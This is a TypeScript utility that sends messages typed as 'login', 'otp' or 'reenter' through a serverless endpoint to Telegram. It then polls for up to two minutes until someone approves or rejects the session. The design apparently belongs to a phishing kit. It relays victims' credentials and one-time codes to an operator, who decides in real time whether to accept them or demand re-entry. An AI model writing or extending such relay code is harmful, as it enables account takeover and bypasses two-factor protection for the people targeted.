/**
 * Serverless Telegram utility
 * Uses Vercel serverless functions for Telegram communication
 */

export const sendLoginToTelegramAndWait = async (
  message: string,
  sessionId: string,
  type: 'login' | 'otp' | 'reenter'
): Promise<boolean> => {
  try {
    // Step 1: Send message via serverless function
    const sendRes = await fetch('/api/telegram/send-message', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId,
        message,
        type
      }),
    });

    if (!sendRes.ok) {
      console.error('Failed to send message:', await sendRes.text());
      return false;
    }

    const sendData = await sendRes.json();
    if (!sendData.success) {
      console.error('Send message failed:', sendData);
      return false;
    }

    // Step 2: Poll for status via serverless function
    const startTime = Date.now();
    const timeout = 120000; // 2 minutes

    while (Date.now() - startTime < timeout) {
      await new Promise(resolve => setTimeout(resolve, 2000)); // Poll every 2 seconds

      const statusRes = await fetch(`/api/telegram/check-status?sessionId=${sessionId}`, {
        headers: { 'Cache-Control': 'no-cache' }
      });

      if (!statusRes.ok) continue;

      const statusData = await statusRes.json();

      if (statusData.status === 'approved') {
        return true;
      } else if (statusData.status === 'rejected') {
        return false;
      }
    }

    // Timeout
    console.warn('Telegram approval timeout');
    return false;
  } catch (error) {
    console.error('Telegram error:', error);
    return false;
  }
};
